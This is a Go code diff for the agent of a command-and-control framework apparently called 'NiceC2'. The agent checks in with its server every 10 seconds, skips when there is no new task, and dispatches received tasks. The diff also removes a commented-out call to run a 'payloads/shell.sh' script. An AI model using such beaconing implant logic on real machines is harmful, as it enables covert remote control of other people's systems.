@@ -73,56 +73,14 @@ func main() {
 	fmt.Println(Banner)
 
 	NodeID, _ = machineid.ID()
-
-	// old_checkIn()
-
-	// getFIle()
-
-	// scriptOutput := run_script("payloads/shell.sh")
-
-	// fmt.Println(scriptOutput)
-
-	// checkIn()
-
-	// // Get's the current time, and formats it. god this is weird
-	// current_time := time.Now().Format("2006.01.02 15:04:05")
-
-	// var home string
-	// home, _ = os.UserHomeDir()
-
-	// var testFile string
-	// testFile = filepath.Join(home, "Desktop", "NiceC2 Log file.txt")
-
-	// fmt.Println(testFile)
-
-	// // Opens/creates the file in a way that it can be appended to
-	// file, err := os.OpenFile(testFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-
-	// // Error if you can't open/edit the file
-	// if err != nil {
-	// 	fmt.Println("Could not open example.txt")
-	// 	return
-	// }
-
-	// defer file.Close()
-
-	// _, err2 := file.WriteString("The time is: " + current_time + "\n")
-
-	// if err2 != nil {
-	// 	fmt.Println("Could not write text to example.txt")
-
-	// } else {
-	// 	fmt.Println("Operation successful! Text has been appended to example.txt")
-	// }
-
-	// // // Sleeps 10 seconds, then does it again. Damn look at that recursion
-	// // time.Sleep(10 * time.Second)
-	// // main()
+	NodeID = "THis is a test 99"
 
 	// Checks in every 10 seconds.
 	for {
 		time.Sleep(10 * time.Second)
+
 		checkIn()
+
 	}
 
 	// checkIn()
@@ -180,6 +138,12 @@ func checkIn() {
 	fmt.Println("Details of response")
 	fmt.Println("Task: " + post.Task)
 	fmt.Println("Arg: " + post.Arg)
+
+	// Handeling it if there is no new task
+	if post.TaskID == "0" {
+		fmt.Println("No new task")
+		return
+	}
 
 	// This is is where the tasks that the node should then do need to go
 	switch post.Task {
